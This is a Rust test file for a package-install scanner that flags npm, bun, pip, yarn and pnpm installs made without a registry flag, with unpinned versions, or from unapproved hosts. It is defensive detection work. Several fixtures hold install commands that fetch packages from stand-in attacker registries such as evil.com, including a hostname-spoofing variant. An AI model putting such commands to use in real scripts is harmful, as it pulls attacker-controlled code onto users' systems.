use std::path::Path;

use oxidized_skills::config::Config;
use oxidized_skills::finding::Severity;
use oxidized_skills::scanners::package_install::PackageInstallScanner;
use oxidized_skills::scanners::Scanner;

fn scan_fixture(fixture: &str) -> oxidized_skills::finding::ScanResult {
    let config = Config::default();
    let path = Path::new("tests/fixtures").join(fixture);
    PackageInstallScanner.scan(&path, &config)
}

#[test]
fn clean_skill_has_no_package_findings() {
    let result = scan_fixture("clean-skill");
    assert!(!result.skipped);
    assert!(
        result.findings.is_empty(),
        "Expected no findings, got: {:?}",
        result.findings
    );
}

#[test]
fn dirty_skill_detects_npm_without_registry() {
    let result = scan_fixture("dirty-skill");
    let f1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "pkg/F1-npm")
        .collect();
    assert!(
        !f1.is_empty(),
        "Expected pkg/F1-npm for npm install without --registry"
    );
    assert_eq!(f1[0].severity, Severity::Warning);
}

#[test]
fn dirty_skill_detects_unpinned_version() {
    let result = scan_fixture("dirty-skill");
    let f2: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "pkg/F2-unpinned")
        .collect();
    assert!(!f2.is_empty(), "Expected pkg/F2-unpinned for @latest");
}

#[test]
fn dirty_skill_detects_bun_without_registry() {
    let result = scan_fixture("dirty-skill");
    let f1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "pkg/F1-bun")
        .collect();
    assert!(
        !f1.is_empty(),
        "Expected pkg/F1-bun for bun add without --registry"
    );
}

#[test]
fn dirty_skill_detects_pip_without_index_url() {
    let result = scan_fixture("dirty-skill");
    let f1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "pkg/F1-pip")
        .collect();
    assert!(
        !f1.is_empty(),
        "Expected pkg/F1-pip for pip install without --index-url"
    );
}

#[test]
fn npm_with_registry_is_ok() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("install.sh"),
        "#!/bin/bash\nnpm install --registry https://registry.npmjs.org express\n",
    )
    .unwrap();

    let config = Config::default();
    let result = PackageInstallScanner.scan(dir.path(), &config);

    let f1_npm: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "pkg/F1-npm")
        .collect();
    assert!(
        f1_npm.is_empty(),
        "npm install with --registry should not trigger F1-npm"
    );
}

#[test]
fn unapproved_registry_is_flagged() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("install.sh"),
        "#!/bin/bash\nnpm install --registry https://evil-registry.example.com express\n",
    )
    .unwrap();

    let config = Config::default();
    let result = PackageInstallScanner.scan(dir.path(), &config);

    let f3: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "pkg/F3-registry")
        .collect();
    assert!(
        !f3.is_empty(),
        "Unapproved registry should trigger F3-registry"
    );
}

// ---------------------------------------------------------------------------
// Fix #2: Registry allowlist must compare by hostname, not raw URL substring
// ---------------------------------------------------------------------------

#[test]
fn registry_allowlist_host_path_bypass_is_detected() {
    // evil.com/registry.npmjs.org/ contains "registry.npmjs.org" as a substring
    // but it is NOT an allowed registry — the allowlist check must compare hosts, not substrings.
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("install.sh"),
        "#!/bin/bash\nnpm install --registry https://evil.com/registry.npmjs.org/ express\n",
    )
    .unwrap();

    let config = Config::default();
    let result = PackageInstallScanner.scan(dir.path(), &config);

    let f3: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "pkg/F3-registry")
        .collect();
    assert!(
        !f3.is_empty(),
        "Path-based registry spoofing (evil.com/registry.npmjs.org/) should trigger F3-registry"
    );
}

#[test]
fn approved_registry_is_not_flagged() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("install.sh"),
        "#!/bin/bash\nnpm install --registry https://registry.npmjs.org express\n",
    )
    .unwrap();

    let config = Config::default();
    let result = PackageInstallScanner.scan(dir.path(), &config);

    let f3: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "pkg/F3-registry")
        .collect();
    assert!(
        f3.is_empty(),
        "registry.npmjs.org is approved — F3-registry should not fire"
    );
}

// ---------------------------------------------------------------------------
// Fix #3: --registry=url (equals sign) is detected
// ---------------------------------------------------------------------------

#[test]
fn registry_equals_form_triggers_f1_npm() {
    // `--registry=https://evil.com` uses = instead of space.
    // Before the fix, RE_HAS_REGISTRY only matched space — so this line looked like
    // "npm install without --registry" and fired F1-npm.  It should NOT fire F1-npm
    // (the registry is present); it should fire F3-registry for the unapproved host.
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("install.sh"),
        "#!/bin/bash\nnpm install --registry=https://evil.com express\n",
    )
    .unwrap();

    let config = Config::default();
    let result = PackageInstallScanner.scan(dir.path(), &config);

    // F1-npm must NOT fire (registry IS specified via =)
    let f1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "pkg/F1-npm")
        .collect();
    assert!(
        f1.is_empty(),
        "F1-npm must not fire when --registry= form is used (registry IS specified)"
    );

    // F3-registry MUST fire (evil.com is not approved)
    let f3: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "pkg/F3-registry")
        .collect();
    assert!(
        !f3.is_empty(),
        "F3-registry must fire for unapproved registry specified via --registry="
    );
}

#[test]
fn registry_equals_form_approved_host_no_findings() {
    // --registry=https://registry.npmjs.org using = form with an approved registry.
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("install.sh"),
        "#!/bin/bash\nnpm install --registry=https://registry.npmjs.org express\n",
    )
    .unwrap();

    let config = Config::default();
    let result = PackageInstallScanner.scan(dir.path(), &config);

    let pkg_findings: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "pkg/F1-npm" || f.rule_id == "pkg/F3-registry")
        .collect();
    assert!(
        pkg_findings.is_empty(),
        "No F1-npm or F3-registry findings expected for approved registry via --registry= form, got: {:?}",
        pkg_findings
    );
}

// ---------------------------------------------------------------------------
// Rule: pkg/F1-yarn
// ---------------------------------------------------------------------------

#[test]
fn yarn_add_without_registry_fires_f1_yarn() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("install.sh"),
        "#!/bin/bash\nyarn add lodash\n",
    )
    .unwrap();

    let config = Config::default();
    let result = PackageInstallScanner.scan(dir.path(), &config);
    let found = result
        .findings
        .iter()
        .any(|f| f.rule_id == "pkg/F1-yarn" && f.severity == Severity::Warning);
    assert!(
        found,
        "yarn add without --registry must trigger pkg/F1-yarn"
    );
}

#[test]
fn yarn_install_without_registry_fires_f1_yarn() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("install.sh"),
        "#!/bin/bash\nyarn install\n",
    )
    .unwrap();

    let config = Config::default();
    let result = PackageInstallScanner.scan(dir.path(), &config);
    let found = result.findings.iter().any(|f| f.rule_id == "pkg/F1-yarn");
    assert!(
        found,
        "yarn install without --registry must trigger pkg/F1-yarn"
    );
}

#[test]
fn yarn_add_with_registry_no_f1_yarn() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("install.sh"),
        "#!/bin/bash\nyarn add --registry https://registry.npmjs.org lodash\n",
    )
    .unwrap();

    let config = Config::default();
    let result = PackageInstallScanner.scan(dir.path(), &config);
    let found = result.findings.iter().any(|f| f.rule_id == "pkg/F1-yarn");
    assert!(
        !found,
        "yarn add with --registry must not trigger pkg/F1-yarn"
    );
}

// ---------------------------------------------------------------------------
// Rule: pkg/F1-pnpm
// ---------------------------------------------------------------------------

#[test]
fn pnpm_add_without_registry_fires_f1_pnpm() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("install.sh"),
        "#!/bin/bash\npnpm add express\n",
    )
    .unwrap();

    let config = Config::default();
    let result = PackageInstallScanner.scan(dir.path(), &config);
    let found = result
        .findings
        .iter()
        .any(|f| f.rule_id == "pkg/F1-pnpm" && f.severity == Severity::Warning);
    assert!(
        found,
        "pnpm add without --registry must trigger pkg/F1-pnpm"
    );
}

#[test]
fn pnpm_install_without_registry_fires_f1_pnpm() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("install.sh"),
        "#!/bin/bash\npnpm install\n",
    )
    .unwrap();

    let config = Config::default();
    let result = PackageInstallScanner.scan(dir.path(), &config);
    let found = result.findings.iter().any(|f| f.rule_id == "pkg/F1-pnpm");
    assert!(
        found,
        "pnpm install without --registry must trigger pkg/F1-pnpm"
    );
}

#[test]
fn pnpm_with_registry_no_f1_pnpm() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("install.sh"),
        "#!/bin/bash\npnpm add --registry https://registry.npmjs.org express\n",
    )
    .unwrap();

    let config = Config::default();
    let result = PackageInstallScanner.scan(dir.path(), &config);
    let found = result.findings.iter().any(|f| f.rule_id == "pkg/F1-pnpm");
    assert!(
        !found,
        "pnpm add with --registry must not trigger pkg/F1-pnpm"
    );
}

// ---------------------------------------------------------------------------
// Fix #1: Snippet truncation does not panic on multi-byte UTF-8 characters
// ---------------------------------------------------------------------------

#[test]
fn snippet_truncation_no_panic_on_multibyte_chars() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    // 116 ASCII chars + emoji (4 bytes) so the raw byte index 117 would be mid-codepoint
    let prefix = "x".repeat(116);
    let line = format!("npm install 🔥{}pkg\n", prefix);
    std::fs::write(
        scripts_dir.join("install.sh"),
        format!("#!/bin/bash\n{line}"),
    )
    .unwrap();

    let config = Config::default();
    // Should not panic; the finding may or may not fire depending on content
    let _result = PackageInstallScanner.scan(dir.path(), &config);
}
